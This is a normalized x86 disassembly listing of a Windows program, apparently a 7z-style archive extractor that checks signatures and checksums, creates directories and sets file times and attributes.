call sub_4023b0
cmp eax [ ebp - 0xa8 ]
jne r-xdata
mov ecx [ ebp - 0x44 ]
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x48 ] edx
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
call sub_404440
add esp 0x8
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
cmp [ ebp - 0x3c ] 0x17
jne r-xdata
cmp [ ebp - 0x3c ] 0x1
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x58 ] 0x4
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
lea edx [ ebp - 0x54 ]
push edx
call sub_402300
add esp 0x4
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
push edx
mov eax [ ecx + 0x20 ]
push eax
lea ecx [ ebp - 0x54 ]
push ecx
lea edx [ ebp - 0x4c ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_406730
add esp 0x18
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4064f0
add esp 0x10
mov [ ebp - 0x58 ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_402380
add esp 0x8
mov edx [ ebp - 0x54 ]
mov [ ebp - 0x44 ] edx
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x44 ]
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x48 ] edx
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
call sub_404440
add esp 0x8
mov [ ebp - 0x58 ] eax
mov ecx [ ebp + 0x14 ]
push ecx
lea edx [ ebp - 0x54 ]
push edx
call sub_402380
add esp 0x8
jmp r-xdata
sub_406c20
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4067f0
add esp 0x10
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403d80
add esp 0x8
sub_406c60
push ebp
mov ebp esp
sub esp 0x34
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
mov edx [ ebp + 0x10 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x20 ]
mov [ ecx ] 0x0
mov edx [ ebp + 0x24 ]
mov [ edx ] 0x0
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x28 ]
push edx
mov eax [ ebp + 0x28 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0x8 ]
mov [ edx ] eax
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x0
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x28
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0xc ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
push edx
call sub_403b50
add esp 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x2c ]
mov [ ebp - 0xc ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_404120
add esp 0xc
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0xc ]
xor ecx ecx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x2c ]
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
cmp edx [ ebp - 0x8 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x28 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x28 ]
push edx
mov eax [ ebp + 0x28 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x18 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_407840
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
shl eax 0x5
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x10 ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp + 0x20 ]
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x24 ]
mov [ edx ] ecx
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp + 0x24 ]
add ecx [ edx ]
mov eax [ ebp + 0x1c ]
cmp ecx [ eax ]
jbe r-xdata
mov eax [ ebp - 0x14 ]
shl eax 0x5
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov eax [ edx + eax + 0x8 ]
mov ecx [ ebp + 0x20 ]
add eax [ ecx ]
mov edx [ ebp + 0x20 ]
mov [ edx ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x28 ]
push eax
mov ecx [ ebp + 0x28 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
mov edx [ ebp + 0x18 ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx + 0x1b ]
test edx edx
je r-xdata
mov eax 0xb
jmp r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x18 ]
mov eax [ edx ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + eax * 4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
lea ecx [ eax + ecx * 8 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_403490
add esp 0x20
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov edx [ ebp + 0x20 ]
add ecx [ edx ]
mov eax [ ebp + 0x24 ]
mov edx [ eax ]
call sub_4023b0
mov ecx [ ebp - 0x18 ]
cmp eax [ ecx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov edx [ ebp - 0xc ]
mov ecx [ ebp + 0x18 ]
mov ecx [ ecx ]
call sub_4023b0
mov edx [ ebp - 0x10 ]
cmp eax [ edx + 0x20 ]
je r-xdata
mov [ ebp - 0x4 ] 0x3
sub_406f00
push ebp
mov ebp esp
push ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ CreateDirectoryW@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_406f30
push ebp
mov ebp esp
mov eax 0x801c
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8010 ] 0x0
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8018 ]
cmp [ eax ] __dos_header
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov ecx 0x8000
sub ecx [ ebp - 0x8010 ]
mov [ ebp - 0x8008 ] ecx
lea edx [ ebp - 0x8008 ]
push edx
mov eax [ ebp - 0x8010 ]
lea ecx [ ebp + eax - 0x8004 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403620
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x8008 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8010 ]
add eax [ ebp - 0x8008 ]
mov [ ebp - 0x8010 ] eax
cmp [ ebp - 0x8010 ] 0x20
jbe r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x8010 ]
sub ecx 0x20
mov [ ebp - 0x8014 ] ecx
mov [ ebp - 0x800c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x800c ]
cmp eax [ ebp - 0x8014 ]
jae r-xdata
mov edx [ ebp - 0x8014 ]
xor eax eax
mov ecx [ ebp + 0xc ]
add edx [ ecx ]
adc eax [ ecx + 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x8010 ]
sub edx [ ebp - 0x8014 ]
mov [ ebp - 0x8010 ] edx
mov eax [ ebp - 0x8010 ]
push eax
mov ecx [ ebp - 0x8014 ]
lea edx [ ebp + ecx - 0x8004 ]
push edx
lea eax [ ebp - 0x8004 ]
push eax
call sub_421ef0
add esp 0xc
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8018 ] ecx
mov edx [ ebp - 0x8018 ]
cmp [ edx + 0x4 ] 0x0
ja r-xdata
mov edx [ ebp - 0x800c ]
movzx eax [ ebp + edx - 0x8004 ]
cmp eax 0x37
je r-xdata
mov edx [ ebp - 0x800c ]
cmp edx [ ebp - 0x8014 ]
jne r-xdata
mov ecx [ ebp - 0x800c ]
cmp ecx [ ebp - 0x8014 ]
jae r-xdata
push 0x6
push rw-data
mov eax [ ebp - 0x800c ]
lea ecx [ ebp + eax - 0x8004 ]
push ecx
call sub_427d98
add esp 0xc
mov [ ebp - 0x801c ] eax
cmp [ ebp - 0x801c ] 0x0
jne r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x800c ]
lea ecx [ ebp + edx - 0x7ff8 ]
mov edx 0x14
call sub_4023b0
mov ecx [ ebp - 0x800c ]
cmp eax [ ebp + ecx - 0x7ffc ]
jne r-xdata
mov ecx [ ebp - 0x800c ]
add ecx 0x1
mov [ ebp - 0x800c ] ecx
mov edx [ ebp - 0x800c ]
add edx 0x1
mov [ ebp - 0x800c ] edx
mov edx [ ebp - 0x800c ]
xor eax eax
mov ecx [ ebp + 0xc ]
add edx [ ecx ]
adc eax [ ecx + 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
mov eax 0x1
jmp r-xdata
sub_407150
push ebp
mov ebp esp
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x258 ] 0x0
lea eax [ ebp - 0x254 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x258 ] eax
cmp [ ebp - 0x258 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x258 ]
push edx
call [ FindClose@IAT ]
mov eax 0x1
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_4071c0
push ebp
mov ebp esp
mov eax 0x4724
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x46d8 ] 0x0
mov [ ebp - 0x46f0 ] 0x0
xor eax eax
mov [ ebp - 0x620 ] ax
push 0x61a
push 0x0
lea ecx [ ebp - 0x61e ]
push ecx
call sub_427900
add esp 0xc
mov edx [ ebp + 0xc ]
mov [ ebp - 0x46e8 ] edx
mov eax [ ebp - 0x46e8 ]
add eax 0x2
mov [ ebp - 0x4708 ] eax
mov ecx [ ebp - 0x46e8 ]
mov dx [ ecx ]
mov [ ebp - 0x46f6 ] dx
add [ ebp - 0x46e8 ] 0x2
cmp [ ebp - 0x46f6 ] 0x0
jne r-xdata
mov eax [ ebp - 0x46e8 ]
sub eax [ ebp - 0x4708 ]
sar eax 0x1
mov [ ebp - 0x4714 ] eax
mov ecx [ ebp - 0x4714 ]
mov [ ebp - 0x46fc ] ecx
mov edx [ ebp + 0xc ]
push edx
push 0x30e
lea eax [ ebp - 0x620 ]
push eax
call sub_422868
add esp 0xc
mov ecx [ ebp - 0x46fc ]
mov edx [ ebp + 0xc ]
movzx eax [ edx + ecx * 2 - 0x2 ]
cmp eax 0x5c
je r-xdata
call sub_4023e0
mov [ ebp - 0x65c ] sub_4022b0
mov [ ebp - 0x658 ] sub_4022e0
mov [ ebp - 0x668 ] sub_4022b0
mov [ ebp - 0x664 ] sub_4022e0
lea edx [ ebp - 0x638 ]
push edx
call sub_4038e0
add esp 0x4
push 0x0
lea eax [ ebp - 0x46d4 ]
push eax
call sub_407b60
add esp 0x8
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x630 ]
push edx
call sub_4035b0
add esp 0x8
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x620 ]
push ecx
call sub_407820
add esp 0x8
lea edx [ ebp - 0x620 ]
mov [ ebp - 0x46ec ] edx
mov eax [ ebp - 0x46ec ]
add eax 0x2
mov [ ebp - 0x471c ] eax
xorpd xmm0 xmm0
movlpd [ ebp - 0x644 ] xmm0
lea eax [ ebp - 0x644 ]
push eax
lea ecx [ ebp - 0x630 ]
push ecx
call sub_406f30
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x46f0 ] r--data
mov [ ebp - 0x46d8 ] 0xb
jmp r-xdata
mov ecx [ ebp - 0x46ec ]
mov dx [ ecx ]
mov [ ebp - 0x46fe ] dx
add [ ebp - 0x46ec ] 0x2
cmp [ ebp - 0x46fe ] 0x0
jne r-xdata
mov eax [ ebp - 0x46ec ]
sub eax [ ebp - 0x471c ]
sar eax 0x1
mov [ ebp - 0x4718 ] eax
mov ecx [ ebp - 0x4718 ]
mov [ ebp - 0x46fc ] ecx
push 0x0
lea edx [ ebp - 0x644 ]
push edx
lea eax [ ebp - 0x630 ]
push eax
call sub_4037a0
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x46d8 ] 0xb
jmp r-xdata
cmp [ ebp - 0x46d8 ] 0x0
jne r-xdata
cmp [ ebp - 0x46d8 ] 0x0
je r-xdata
mov [ ebp - 0x46d8 ] 0xb
lea eax [ ebp - 0x6b8 ]
push eax
call sub_403d20
add esp 0x4
cmp [ ebp - 0x46d8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x638 ]
mov [ ebp - 0x46c4 ] ecx
lea edx [ ebp - 0x46d4 ]
push edx
call sub_407bb0
add esp 0x4
mov [ ebp - 0x46f0 ] r--data
cmp [ ebp - 0x46d8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x668 ]
push ecx
lea edx [ ebp - 0x65c ]
push edx
lea eax [ ebp - 0x46d4 ]
push eax
lea ecx [ ebp - 0x6b8 ]
push ecx
call sub_406c20
add esp 0x10
mov [ ebp - 0x46d8 ] eax
lea edx [ ebp - 0x65c ]
push edx
lea eax [ ebp - 0x6b8 ]
push eax
call sub_403d80
add esp 0x8
lea ecx [ ebp - 0x630 ]
push ecx
call sub_4035f0
add esp 0x4
cmp [ ebp - 0x46d8 ] 0x0
jne r-xdata
mov [ ebp - 0x4720 ] 0xffffffff
mov [ ebp - 0x4724 ] 0x40000000
mov [ ebp - 0x63c ] 0xffffffff
mov [ ebp - 0x650 ] 0x0
mov [ ebp - 0x62c ] 0x0
mov [ ebp - 0x46dc ] 0x0
jmp r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x46dc ]
cmp eax [ ebp - 0x69c ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x650 ]
push eax
lea ecx [ ebp - 0x65c ]
push ecx
call [ ebp - 0x658 ]
add esp 0x8
mov [ ebp - 0x660 ] 0x0
mov [ ebp - 0x624 ] 0x0
mov ecx [ ebp - 0x46dc ]
shl ecx 0x5
add ecx [ ebp - 0x6a8 ]
mov [ ebp - 0x46e4 ] ecx
push 0x0
mov edx [ ebp - 0x46dc ]
push edx
lea eax [ ebp - 0x6b8 ]
push eax
call sub_405b20
add esp 0xc
mov [ ebp - 0x4710 ] eax
cmp [ ebp - 0x4710 ] 0x104
jb r-xdata
mov ecx [ ebp - 0x46fc ]
lea edx [ ebp + ecx * 2 - 0x620 ]
mov [ ebp - 0x46f4 ] edx
mov eax [ ebp - 0x46f4 ]
push eax
mov ecx [ ebp - 0x46dc ]
push ecx
lea edx [ ebp - 0x6b8 ]
push edx
call sub_405b20
add esp 0xc
lea eax [ ebp - 0x668 ]
push eax
lea ecx [ ebp - 0x65c ]
push ecx
lea edx [ ebp - 0x624 ]
push edx
lea eax [ ebp - 0x660 ]
push eax
lea ecx [ ebp - 0x62c ]
push ecx
lea edx [ ebp - 0x650 ]
push edx
lea eax [ ebp - 0x63c ]
push eax
mov ecx [ ebp - 0x46dc ]
push ecx
lea edx [ ebp - 0x46d4 ]
push edx
lea eax [ ebp - 0x6b8 ]
push eax
call sub_406c60
add esp 0x28
mov [ ebp - 0x46d8 ] eax
cmp [ ebp - 0x46d8 ] 0x0
je r-xdata
mov [ ebp - 0x46d8 ] 0xb
jmp r-xdata
mov [ ebp - 0x470c ] 0x0
mov [ ebp - 0x46e0 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x46e0 ]
mov eax [ ebp - 0x46f4 ]
movzx ecx [ eax + edx * 2 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x46e4 ]
movzx edx [ ecx + 0x19 ]
test edx edx
je r-xdata
mov edx [ ebp - 0x46e0 ]
mov eax [ ebp - 0x46f4 ]
movzx ecx [ eax + edx * 2 ]
cmp ecx 0x2f
jne r-xdata
push 0x0
lea ecx [ ebp - 0x620 ]
push ecx
call sub_407150
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebp - 0x620 ]
push eax
call sub_406f00
add esp 0x4
jmp r-xdata
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x46e0 ]
mov ecx [ ebp - 0x46f4 ]
mov [ ecx + eax * 2 ] dx
lea edx [ ebp - 0x620 ]
push edx
call sub_406f00
add esp 0x4
mov eax 0x5c
mov ecx [ ebp - 0x46e0 ]
mov edx [ ebp - 0x46f4 ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x46e0 ]
add eax 0x1
mov [ ebp - 0x470c ] eax
lea edx [ ebp - 0x620 ]
push edx
lea eax [ ebp - 0x654 ]
push eax
call sub_4035d0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x46f0 ] r--data
mov [ ebp - 0x46d8 ] 0xb
jmp r-xdata
mov edx [ ebp - 0x46dc ]
add edx 0x1
mov [ ebp - 0x46dc ] edx
mov ecx [ ebp - 0x46e0 ]
add ecx 0x1
mov [ ebp - 0x46e0 ] ecx
mov ecx [ ebp - 0x624 ]
mov [ ebp - 0x628 ] ecx
lea edx [ ebp - 0x628 ]
push edx
mov eax [ ebp - 0x650 ]
add eax [ ebp - 0x660 ]
push eax
lea ecx [ ebp - 0x654 ]
push ecx
call sub_4036e0
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x46f0 ] r--data
mov [ ebp - 0x46d8 ] 0xb
jmp r-xdata
mov [ ebp - 0x46f0 ] r--data
mov [ ebp - 0x46d8 ] 0xb
mov edx [ ebp - 0x628 ]
cmp edx [ ebp - 0x624 ]
je r-xdata
lea edx [ ebp - 0x654 ]
push edx
call sub_4035f0
add esp 0x4
mov [ ebp - 0x4704 ] eax
cmp [ ebp - 0x46d8 ] 0x0
je r-xdata
mov edx [ ebp - 0x46e4 ]
mov eax [ edx ]
mov [ ebp - 0x64c ] eax
mov ecx [ ebp - 0x46e4 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x648 ] edx
lea eax [ ebp - 0x64c ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x654 ]
push ecx
call [ SetFileTime@IAT ]
mov eax [ ebp - 0x46e4 ]
movzx ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x4704 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x46e4 ]
movzx edx [ ecx + 0x1d ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4704 ]
mov [ ebp - 0x46d8 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x46e4 ]
mov ecx [ eax + 0x14 ]
push ecx
lea edx [ ebp - 0x620 ]
push edx
call [ SetFileAttributesW@IAT ]
sub_407840
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
push 0x0
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
call edx
add esp 0xc
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_407880
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
call edx
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x8 ]
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
sub ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] ecx
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
je r-xdata
sub_4078f0
push ebp
mov ebp esp
push 0x6
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_407880
add esp 0x10
pop ebp
retn
sub_407910
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ecx + 0x18 ]
sub eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax ]
jae r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] 0x0
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x14 ]
mov eax [ ebp - 0xc ]
lea ecx [ eax + edx + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov [ edx + 0x14 ] 0x0
mov [ ebp - 0x8 ] 0x4000
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
add ecx 0x1c
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x10 ]
mov eax [ edx ]
call eax
add esp 0xc
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x18 ] edx
sub_4079c0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x18 ]
sub eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx ]
jae r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
lea eax [ edx + ecx + 0x1c ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x4000
jbe r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp - 0x4 ]
add eax 0x1c
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov edx [ ecx ]
call edx
add esp 0xc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] 0x4000
sub_407a70
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
add edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] edx
xor eax eax
mov esp ebp
pop ebp
retn
sub_407a90
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x18 ]
sub eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx ]
jbe r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov ecx [ eax ]
call ecx
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx + 0x1c ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_424fc0
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x10 ]
